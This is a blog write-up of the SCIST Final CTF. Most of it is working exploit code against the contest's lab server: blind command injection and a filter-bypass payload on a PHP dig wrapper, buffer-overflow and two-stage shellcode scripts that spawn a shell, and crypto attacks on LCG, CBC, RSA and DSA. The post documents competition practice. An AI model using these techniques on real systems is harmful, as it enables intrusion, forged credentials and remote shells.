---
title: SCIST Final CTF Writeup
published: 2025-07-21
description: 'SCIST Final CTF Writeup'
image: 'SCIST.png'
tags: [CTF,Writeup]
category: 'Writeup'
draft: false 
lang: ''
---

# SCIST Final CTF Write Up
題目前面加上[*]代表賽後解
## Web

### dig-blind2
```php
<?php if (isset($_POST['name'])) : ?>
<p>
    <p>dig result:</p>
    <pre><?php 
      exec("dig '" . $_POST['name'] . "';", $_, $return_status); 
      if ($return_status === 0) {
          echo 'success';
      } else {
          echo 'fail';
      }
    ?></pre>
</p>
<?php endif; ?>
```
exploit:
```py
import requests, string

URL = "http://lab.scist.org:31601/"

def check_char(pos, c):
    c = c.replace("'", "'\\''").replace("\"", "\\\"").replace("$", "\\$")
    cmd = f"[ \"$(cut -c{pos} /flag)\" = \"{c}\" ]"
    payload = f"google.com' && {cmd} #"
    try:
        r = requests.post(URL, data={"name": payload}, timeout=5)
        return "<pre>success</pre>" in r.text
    except:
        return False

def extract_flag():
    charset = "SCIST{}_" + string.ascii_uppercase + string.ascii_lowercase + string.digits + "-"
    flag = ""
    for pos in range(1, 51):
        for c in charset:
            if check_char(pos, c):
                flag += c
                print(f"\r[+] {flag}")
                break
        else:
            break
    return flag

if __name__ == "__main__":
    f = extract_flag()
    print(f"{f}")

```

### [*] dig-waf5
```php
<?php if (isset($_POST['name'])): ?>
    <p>dig result:</p>
    <pre>
<?php
        $good = preg_match('/^(?i)(?!.*flag)[A-z0-9\'$]+$/', $_POST['name']);

        if (!$good) {
            echo "BAD HACKER!!!";
        } else {
            $cmd = 'bash -c "dig \'' . $_POST['name'] . '\'"';
            system($cmd);
        }
?>
    </pre>
<?php endif; ?>
```

噁到爆的題目，目標是想辦法讀到/flag，然後只接受 A-Z,a-z,0-9,'$[]^_跟反單引，其他任何符號也都會被檔，也不能直接組flag，我原本思路是繞過各種限制組成`ls /`，payload如下:

\`ls\$IFS\`echo\$IFS'\057'\`\`

- $IFS繞過空白
- 利用echo印出/
- 包在`裡面執行

但發現結果是index.phpecho057長這樣，可以觀察到反單引是從外面執行到內層的所以行不通，後來思路是反單引印出ls space /，也確實結果是ls /但還是執行不了因為最外層要包覆反單引，但包覆又會是如上結果。

賽後根據提示，可以去挖dig查語法:
```
dig [@server] [-b address] [-c class] [-f filename] [-k keyfile] [-m] [-p port#] [-q 名稱] [-t type] [-u] [-v] [-x addr] [-y [hmac:] name: key] [-4] [-6] [name] [type] [class] [queryopt ...]
```

可以發現有-f可以用組出`dig -f/flag`，然後用\$\'..\'組出任意commad
舉例:``$'\x2f'``，result:`bear@DESKTOP-6VT9PSI:$ $'\x2f'
-bash: /: Is a directory`

所以基本來說死嗑反引號的都解不出來。

最終payload:`'$'\x2d'f$9$'\x2f'$'\x66'lag'`

## Reverse

### Checker101

exploit:
```py
# .rodata:0000000001021C00 db 54h
# .rodata:0000000001021C01 db 'DNTS|Mrt0X3X2njw64XA63>Xdo4dl4uX2o7rkcXe4X3Xwn4dbX7aXd3l4&z'

encrypted_first_byte = 0x54
encrypted_rest_string = "DNTS|Mrt0X3X2njw64XA63>Xdo4dl4uX2o7rkcXe4X3Xwn4dbX7aXd3l4&z"

encrypted_bytes = [encrypted_first_byte] + [ord(c) for c in encrypted_rest_string]

key = 7
decrypted_bytes = [b ^ key for b in encrypted_bytes]

flag = "".join([chr(b) for b in decrypted_bytes])

print(f"{flag}")
```

### Duel

exploit:

```py
from pwn import *

p = remote("lab.scist.org", 31605)

print("Choosing weapon '7'...")
p.sendlineafter(b'> ', b'7')

print("Waiting for the 'Start!' signal...")
p.recvuntil(b'Start!\n')

print("Signal received! Firing!")
p.send(b' ')

print("Receiving the result...")

p.interactive()

#SCIST{H4ha_ch0051ng_4_900d_w3ap0n_15_much_m0r3_imp07ant}
```

### [*] Neko Identification

題目給了.html檔主要是一個上傳圖片然後裡面有被混淆過的JS，拿去線上Deobfuscator
```js
(function (H, L) {
  const J = i;
  const m = H();
  while (true) {
    try {
      const I = parseInt(J(399)) / 1 * (-parseInt(J(410)) / 2) + parseInt(J(403)) / 3 * (-parseInt(J(413)) / 4) + -parseInt(J(406)) / 5 + -parseInt(J(397)) / 6 + -parseInt(J(414)) / 7 + -parseInt(J(417)) / 8 + parseInt(J(426)) / 9;
      if (I === L) {
        break;
      } else {
        m.push(m.shift());
      }
    } catch (Y) {
      m.push(m.shift());
    }
  }
})(G, 111600);
const a = [84, 97, 109, 97, 107, 105, 32, 75, 111, 116, 97, 116, 115, 117];
function G() {
  const X = ["arrayBuffer", "wKBck", "color", "4LAkRdM", "length", "imageInput", "116ehsHeu", "1127161FMAmaN", "ofbaM", "result", "603712xoHuuw", "not a neko", "Please upload a file", "green", "Image too small", "WnaiF", "hMsIh", "textContent", "getElementById", "5763465oMPzgo", "VeiKn", "724992NJWWXa", "Nyan!", "39315PgXeea", "red", "files", "YfLQx", "1206gaSnBI", "CqRYM", "KmABs", "405890uCeNbt"];
  G = function () {
    return X;
  };
  return G();
}
function i(H, L) {
  const m = G();
  i = function (I, Y) {
    I = I - 396;
    let d = m[I];
    return d;
  };
  return i(H, L);
}
function showResult(H, L) {
  const t = i;
  const m = document[t(425)](t(416));
  m[t(424)] = H;
  m.style[t(409)] = L;
}
```
裡面a陣列看起來很可疑，我以為是把a陣列寫到圖片的metadata然後丟進去驗證，但試了好多次都沒辦法，最後還是沒想到怎麼繞過"NOT A NEKO"的ERROR限制。

賽後看別人解釋說把a array跟b array做xor就好...，還有人用兩的個prompt給ai就解出來...

## Pwn 

### Checkin

exploit:
```py
from pwn import *

r=remote('lab.scist.org',31606)

context.arch='amd64'

p=b'a'*40+p64(0x40101a)+p64(0x401955)

r.sendlineafter('?',p)

r.interactive()
```

### [*] Return to shellcode 2015

題目給了 get() 可以BOF然後保護機制都沒開，但是限制你只能在16bytes內組出shellcode，在 https://www.exploit-db.com/shellcodes 找了老半天也最多只有21bytes的shellcode，也沒有地方可以stack pivoting，整理一下目前資訊:

- 程式會使用 fgets(buf, 24, stdin) 讀入我們的 payload → 實際最多能送進 23 bytes。

- mov byte ptr [rbp-1], 0x0 會污染 payload 的第 8 byte。

- Stack 是可執行的，所以我們能直接在 stack 上放 shellcode。

所以我們需要把 shellcode 分兩段送：

第一段：read(0, rsp, 0x40); jmp rsp loader

第二段：真正的 shellcraft.sh()。

先放我失敗的版本跟gemini詳解:
```py
from pwn import *

context.arch = 'amd64'
context.binary = elf = ELF('./ret2sc')
context.log_level = 'debug'

# r = remote("lab.scist.org", 31607)
r = process(elf.path)

jmp_rax = 0x4010ac

stage1_shellcode = asm("""
    xor rdi, rdi
    lea rsi, [rax+8]
    mov dl, 0x7f
    xor rax, rax
    syscall
    jmp rsi
""")

payload = asm("nop") * 8 + stage1_shellcode

payload = payload.ljust(16, b"\x90") + p64(jmp_rax)[:7]

r.sendlineafter(b"\n", payload)

r.send(asm(shellcraft.sh()))
r.interactive()
```
執行流程與問題點

1.  `fgets` 將你的 `payload` 讀入 `buf`。此時 `rax` 指向 `buf` 的開頭，也就是 8 個 NOP 的起始位置。
2.  程式返回到 `jmp rax`，CPU 跳轉到 `buf` 開頭。
3.  執行 8 個 NOP (`\x90`) 後，來到你的 `stage1_shellcode`。
4.  `stage1_shellcode` 開始執行：
    * `xor rdi, rdi; mov dl, 0x7f; xor rax, rax`: 設定 `read` 參數，這部分沒問題。
    * `lea rsi, [rax+8]`: **這是主要問題點！**
        * `rax` 仍然是 `buf` 的起始位址。
        * `rax+8` 指向哪裡？它指向 `buf` 開頭往後 8 個 byte 的地方，也就是你 `stage1_shellcode` 的**起始位置**。
        * 所以 `rsi` 現在的值就是你 `stage1_shellcode` 的位址。
    * `syscall`: 系統開始等待輸入，並準備將內容寫入到 `rsi` 指向的位址。
    * `r.send(asm(shellcraft.sh()))`: 你送出第二段 shellcode。
5.  **災難發生：** `read` 系統呼叫會把 `shellcraft.sh()` 的內容從 `stage1_shellcode` 的開頭開始**覆蓋**下去。你的 `syscall` 和 `jmp rsi` 指令會被 `shellcraft.sh()` 的前幾個 byte (`\x48\x31\xd2...`) 給蓋掉。
6.  當 `syscall` 執行完畢後，CPU 接著要執行下一條指令。但原本的 `jmp rsi` 已經不存在了，取而代之的是 `shellcraft.sh()` 的一部分，這幾乎不可能剛好是你想要的指令，於是程式崩潰 (Segmentation fault)。

別人成功版本:
```py
#!/usr/bin/env python3
from pwn import *
import time

context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'info'

# p = process('./chal')
p = remote('lab.scist.org', 31607)

jmp_rax = 0x4010ac

loader = asm("""
    xor edi, edi      # rdi = 0 (arg1: fd=stdin)
    mov rsi, rsp      # rsi = rsp (arg2: buf=current stack pointer)
    mov edx, 0x40     # rdx = 0x40 (arg3: count=64 bytes)
    xor eax, eax      # rax = 0 (syscall number for read)
    syscall           # 執行 read(0, rsp, 0x40)
    jmp rsp           # 跳到 rsp，也就是剛讀進來的 shellcode
""")

payload1 = loader + p64(jmp_rax)
assert len(payload1) == 24

log.info("Sending stage 1")
p.send(payload1[:23])
time.sleep(0.5)

log.info("Sending stage 2")
payload2 = asm(shellcraft.sh())
p.send(payload2)

p.interactive()
```
執行流程

1.  `fgets` 將 `payload1` 讀入到 stack 上的 `buf`。
2.  `fgets` 函式返回，其回傳值 (buf 的位址) 存放在 `rax` 暫存器中。
3.  BOF 觸發，程式執行完畢後返回到我們指定的位址 `0x4010ac` (`jmp rax`)。
4.  `jmp rax` 執行，CPU 跳轉到 `buf` 的開頭，也就是 `loader` shellcode 的位置。
5.  `loader` 開始執行：
    * `xor edi, edi; mov edx, 0x40; xor eax, eax`: 設定 `read` 系統呼叫的參數。
    * `mov rsi, rsp`: **這是關鍵！** 此時 `rsp` 指向哪裡？因為我們剛透過 `jmp rax` 跳轉過來，`rsp` 正好指向 `jmp rax` 這個返回位址在 stack 上的下一個位置。換句話說，`rsp` 指向一個緊鄰著我們第一段 payload 的、乾淨的、可用的 stack 空間。
    * `syscall`: 核心開始等待我們從 `stdin` 輸入第二段 payload。輸入的內容會被直接寫入到 `rsp` 所指向的記憶體位址。
    * `p.send(payload2)`: 我們送出真正的 `shellcraft.sh()`。
    * `jmp rsp`: `read` 結束後，`rsp` 仍然指向剛剛寫入的 `shellcraft.sh()` 的開頭。`jmp rsp` 執行，成功跳轉到第二段 shellcode，取得 shell。

這個方法的美妙之處在於，它完美地利用了 stack 的連續性，讀取和執行的位置無縫銜接，且不會互相干擾。

## Crypto

又來到 prompt engineering 題目

### owo

exploit:
```python
#!/usr/bin/env python3
from pwn import remote
from Crypto.Util.number import long_to_bytes
from math import gcd

# Conectarse al servidor del reto
conn = remote('lab.scist.org', 31611)

# --- Paso 1: Recuperar los estados del LCG ---
states = []
# La entrada que se convierte en 0 después del NOT es 'ff...ff' (64 bytes)
null_input_hex = 'ff' * 64

print("[+] Recuperando 10 estados del LCG...")
for i in range(10):
    conn.recvuntil(b'> ')
    conn.sendline(null_input_hex.encode())
    conn.recvuntil(b'oWo = ')
    leaked_hex = conn.recvline().strip().decode()
    state = int(leaked_hex, 16)
    states.append(state)
    print(f"  Estado {i+1}: {hex(state)}")

# --- Paso 2: Crackear el LCG para encontrar 'owo' ---
diffs = [states[i+1] - states[i] for i in range(len(states) - 1)]

# T_i = d_{i+2}*d_i - d_{i+1}^2 debe ser un múltiplo de owo
multiples_of_owo = []
for i in range(len(diffs) - 2):
    term = diffs[i+2] * diffs[i] - diffs[i+1]**2
    multiples_of_owo.append(abs(term))

# owo será el GCD de estos múltiplos
print("\n[+] Calculando el módulo 'owo'...")
owo = gcd(multiples_of_owo[0], multiples_of_owo[1])
for i in range(2, len(multiples_of_owo)):
    owo = gcd(owo, multiples_of_owo[i])

print(f"  Módulo recuperado (owo): {hex(owo)}")

# --- Paso 3: Recuperar 'OwO' y 'OWO' ---
C1, C2, C3 = states[0], states[1], states[2]
d1 = C2 - C1
d2 = C3 - C2

print("[+] Calculando los parámetros 'OwO' y 'OWO'...")
# a = d2 * (d1^-1) mod owo
d1_inv = pow(d1, -1, owo)
OwO = (d2 * d1_inv) % owo

# b = C2 - a*C1 mod owo
# Como el incremento es -OWO, OWO = -b = a*C1 - C2 mod owo
OWO = (OwO * C1 - C2) % owo

print(f"  Multiplicador recuperado (OwO): {hex(OwO)}")
print(f"  Parámetro recuperado (OWO): {hex(OWO)}")

# --- Paso 4: Revertir el LCG para encontrar la bandera ---
# Primero, encontrar el estado antes de nuestra primera interacción (C_100 en la cronología del servidor)
# C_1 = (OwO * C_100 - OWO) mod owo  => C_100 = (C_1 + OWO) * OwO_inv mod owo
print("\n[+] Revertiendo el LCG para encontrar la bandera...")
OwO_inv = pow(OwO, -1, owo)
current_state = states[0]  # Este es C_1 (o C_101 en la cronología del servidor)

# Revertir una iteración para obtener C_100
current_state = ((current_state + OWO) * OwO_inv) % owo
print(f"  Estado C_100 recuperado: {hex(current_state)}")

# Revertir las 100 iteraciones iniciales
# La función de inversión es: state = (state + OWO) * OwO_inv mod owo
for i in range(100):
    current_state = ((current_state + OWO) * OwO_inv) % owo

# El estado final es el valor entero de la bandera
flag_long = current_state
flag_bytes = long_to_bytes(flag_long)

print("\n" + "="*40)
print(f"  FLAG: {flag_bytes.decode()}")
print("="*40)

conn.close()

```
### Yoshino's Secret Plus

exploit:
```python
#!/usr/bin/env python3
from pwn import remote, context, log
import codecs
import time

# 將 pwntools 的日誌等級設為 'error'，避免過多輸出
context.log_level = 'error'

def xor(b1: bytes, b2: bytes) -> bytes:
    """對兩個 bytes 物件進行 XOR 運算"""
    return bytes([x ^ y for x, y in zip(b1, b2)])

def calculate_flip_pos() -> int:
    """
    動態計算 'admin=0' 中 '0' 的翻轉位置，不再硬編碼。
    """
    # 根據伺服器原始碼重建 passkey 的結構
    # 我們不需要知道 secret 的內容，只需要知道它的格式來計算長度
    id_string = "Tomotake_Yoshino_is_the_cutest<3"
    dummy_secret_hex = "00" * 8  # 8 bytes urandom -> 16 hex chars
    passkey_structure = f'OTP=12345678&id={id_string}&admin=0&secret={dummy_secret_hex}'

    # 找到 'admin=0' 中 '0' 的索引
    try:
        target_char_index = passkey_structure.find("admin=0") + 6
        if target_char_index < 6: # .find() 找不到時返回 -1
            raise IndexError("Cannot find 'admin=0' in plaintext structure.")
    except IndexError as e:
        log.failure(str(e))
        log.failure("腳本攻擊失敗，可能是伺服器端的 id 字串已更改。")
        exit(1)
        
    # 計算 '0' 在哪個明文區塊 (P_n)
    # P1 是區塊 0, P2 是區塊 1, ...
    block_index = target_char_index // 16
    offset_in_block = target_char_index % 16
    
    # 要修改 P_n，需要翻轉前一個密文塊 C_{n-1}
    # C_{n-1} 在完整 token (IV || C1 || C2 ...) 中的起始位置是 16 * n
    # 所以最終位置是 16 * n + offset
    final_pos = 16 * block_index + offset_in_block
    
    log.info(f"動態計算出的翻轉位置 (flip_pos) 為: {final_pos}")
    return final_pos

def attempt_attack(flip_pos: int):
    """執行一次攻擊"""
    conn = None
    try:
        conn = remote('lab.scist.org', 31609)
        conn.recvuntil(b'token: ')
        initial_token_hex = conn.recvline().strip().decode()
        initial_token = codecs.decode(initial_token_hex, 'hex')
        conn.recvuntil(b'OTP: ')
        server_otp = int(conn.recvline().strip().decode())

        # 偽造 admin=1，使用動態計算出的 flip_pos
        flip_val = ord('0') ^ ord('1')
        token_list = list(initial_token)
        token_list[flip_pos] ^= flip_val
        token_admin_flipped = bytes(token_list)

        # 偽造 OTP
        p1_original = b'OTP=12345678&id='
        p1_new_target = f'OTP={server_otp:08d}&id='.encode()
        iv_original = token_admin_flipped[:16]
        iv_flipped = xor(iv_original, xor(p1_original, p1_new_target))
        
        final_token = iv_flipped + token_admin_flipped[16:]
        final_token_hex = final_token.hex()

        # 發送並檢查結果
        conn.sendlineafter(b'token > ', final_token_hex.encode())
        response = conn.recvall(timeout=2).decode()

        if "FLAG" in response or "SCIST" in response:
            print("\n" + "="*50)
            print("  🎉🎉🎉 成功找到 FLAG! 🎉🎉🎉")
            print(f"  {response.strip()}")
            print("="*50)
            return True
        else:
            return False
    except Exception:
        return False
    finally:
        if conn:
            conn.close()

if __name__ == '__main__':
    # 首先，動態計算出最關鍵的翻轉位置
    flip_pos = calculate_flip_pos()

    max_retries = 50 
    for i in range(1, max_retries + 1):
        print(f"[*] 正在進行第 {i}/{max_retries} 次嘗試...")
        if attempt_attack(flip_pos):
            print("\n[+] 攻擊成功！")
            break
        time.sleep(0.5)
    else:
        print("\n[-] 已達最大重試次數，攻擊失敗。")
```


### RSA SigSig

exploit:
```python
#!/usr/bin/env python3
from pwn import remote, log
from Crypto.Util.number import bytes_to_long

# 連線到伺服器
conn = remote('lab.scist.org', 31613)

# 1. 接收 get_example() 的輸出
conn.recvuntil(b'pkey = ')
pkey_ex = int(conn.recvline().strip())
conn.recvuntil(b'skey = ')
skey_ex = int(conn.recvline().strip())
conn.recvuntil(b'n = ')
n = int(conn.recvline().strip())

log.info(f"Received n, pkey_ex, skey_ex")

# 2. 從 skey 計算私鑰指數 d
half = 1024 // 2
left_part = skey_ex >> half
right_part = skey_ex & ((1 << half) - 1)
d_ex = left_part * right_part

log.info(f"Calculated example private exponent d_ex")

# 3. 計算 M = k * phi(n)
# 這是整個攻擊的關鍵，M 是 phi(n) 的一個倍數
M = pkey_ex * d_ex - 1
log.info("Calculated M (a multiple of phi(n))")

# 4. 進入 get_flag() 迴圈並偽造簽章
# 我們只需要成功一次即可
log.info("Waiting for the flag challenge...")
conn.recvuntil(b'pkey = ')
pkey_chal = int(conn.recvline().strip())
log.info(f"Received challenge pkey = {pkey_chal}")

# 5. 計算挑戰的「偽私鑰」
# 關鍵捷徑：直接用 M 作為模數來計算反元素，而無需分解 n
try:
    d_chal_pseudo = pow(pkey_chal, -1, M)
    log.info("Calculated pseudo-private key d'_chal using M")
except ValueError:
    log.error("Failed to compute inverse. gcd(pkey_chal, M) != 1. This is rare. Try rerunning.")
    exit(1)

# 6. 計算簽章
message_bytes = b'give_me_flag'
message_long = bytes_to_long(message_bytes)

# S^e = m ^ e  =>  S = (m ^ e)^d
target = message_long ^ pkey_chal
signature = pow(target, d_chal_pseudo, n)
log.info(f"Calculated forged signature")

# 7. 發送簽章
conn.sendlineafter(b"signature : ", str(signature).encode())

# 8. 接收 FLAG
log.success("Signature sent. Receiving flag...")
response = conn.recvall(timeout=5).decode()
print("\n" + "="*20 + " FLAG " + "="*20)
print(response)
print("="*46)

conn.close()
```

### dsaaaaaaaaaaaaaaaaa

exploit:
```python
#!/usr/bin/env python3
from pwn import remote
from Crypto.Util.number import bytes_to_long, long_to_bytes
from hashlib import sha1
from random import randint

# Función de hash del reto
def H(m):
    return bytes_to_long(sha1(m).digest())

# Conectar al servidor
conn = remote('lab.scist.org', 31612)

# --- Paso 1: Extraer parámetros públicos ---
print("[+] Extrayendo parámetros públicos del servidor...")
conn.recvuntil(b'p = ')
p = int(conn.recvline().strip())
conn.recvuntil(b'q = ')
q = int(conn.recvline().strip())
conn.recvuntil(b'g = ')
g = int(conn.recvline().strip())
conn.recvuntil(b'y = ')
y = int(conn.recvline().strip())

# CORREGIDO: Convertir a string antes de rebanar
print(f"  p = {str(p)[:20]}... q = {str(q)[:20]}...")

# --- Paso 2: Obtener dos firmas con el mismo nonce ---
print("\n[+] Obteniendo firmas para realizar el ataque de reutilización de nonce...")

# Obtener la primera firma en t=0
conn.recvuntil(b'> ')
conn.sendline(b'e')
conn.recvuntil(b'> ')
conn.sendline(b'a') # Mensaje 'AyachiNene'
conn.recvuntil(b'r = ')
r1 = int(conn.recvline().strip())
conn.recvuntil(b's = ')
s1 = int(conn.recvline().strip())
m1 = b'AyachiNene'
# CORREGIDO: Convertir a string antes de rebanar
print(f"  Firma 1 (t=0) para '{m1.decode()}': (r={str(r1)[:10]}..., s={str(s1)[:10]}...)")

# Avanzar el contador t de 1 a 5
for i in range(5):
    conn.recvuntil(b'> ')
    conn.sendline(b'e')
    conn.recvuntil(b'> ')
    conn.sendline(b'i') # Cualquier mensaje sirve

print("  Avanzando el contador de tiempo de t=1 a t=5...")

# Obtener la segunda firma en t=6 (nonce se reutiliza)
conn.recvuntil(b'> ')
conn.sendline(b'e')
conn.recvuntil(b'> ')
conn.sendline(b'i') # Mensaje 'InabaMeguru'
conn.recvuntil(b'r = ')
r2 = int(conn.recvline().strip())
conn.recvuntil(b's = ')
s2 = int(conn.recvline().strip())
m2 = b'InabaMeguru'
# CORREGIDO: Convertir a string antes de rebanar
print(f"  Firma 2 (t=6) para '{m2.decode()}': (r={str(r2)[:10]}..., s={str(s2)[:10]}...)")

# --- Paso 3: Calcular la clave privada 'x' ---
print("\n[+] Calculando la clave privada 'x'...")
h1 = H(m1)
h2 = H(m2)

# x = (s1*H(m2) - s2*H(m1)) * (s2*r1 - s1*r2)^-1 mod q
num = (s1 * h2 - s2 * h1) % q
den = (s2 * r1 - s1 * r2) % q
den_inv = pow(den, -1, q)
x = (num * den_inv) % q
# CORREGIDO: Convertir a string antes de rebanar
print(f"  Clave privada recuperada (x): {str(x)[:20]}...")

# --- Paso 4: Falsificar la firma para 'GET_FLAG' ---
print("\n[+] Falsificando la firma para el mensaje 'GET_FLAG'...")
m_flag = b'GET_FLAG'
h_flag = H(m_flag)

# Generar una firma válida con nuestra clave privada 'x'
k_new = randint(1, q - 1)
r_flag = pow(g, k_new, p) % q
s_flag = (pow(k_new, -1, q) * (h_flag + x * r_flag)) % q

# CORREGIDO: Convertir a string antes de rebanar
print(f"  Firma falsificada: (r={str(r_flag)[:10]}..., s={str(s_flag)[:10]}...)")

# --- Paso 5: Enviar la firma y obtener la bandera ---
print("\n[+] Enviando firma falsificada al servidor...")
conn.recvuntil(b'> ')
conn.sendline(b'g')
conn.recvuntil(b'r: ')
conn.sendline(str(r_flag).encode())
conn.recvuntil(b's: ')
conn.sendline(str(s_flag).encode())

# Leer la respuesta del servidor
response = conn.recvall().decode()
print("\n" + "="*50)
print("  Respuesta del Servidor:")
print(response.strip())
print("="*50)

```

## Misc

### MIT license

exploit:
```python
from pwn import *
import re

HOST = 'lab.scist.org'
PORT = 31603

log.info(f"Connecting to {HOST}:{PORT}")
p = remote(HOST, PORT)

p.recvuntil(b"Enter code: ")

p.sendline(b"patch")

p.recvuntil(b"src: ")
p.sendline(b"_Printer__filenames")

p.recvuntil(b"dst: ")
p.sendline(b"_MIT__flag")

p.recvuntil(b"Enter code: ")
p.sendline(b"license")

p.interactive()
#SCIST{MIT-license_can_readfile!}
```

## 總結
這次拿到正式組第9名，最高第4名的蠻可惜的。
![image](https://hackmd.io/_uploads/H1zb3PjUex.png)
![image](https://hackmd.io/_uploads/BJEi2PsIle.png)

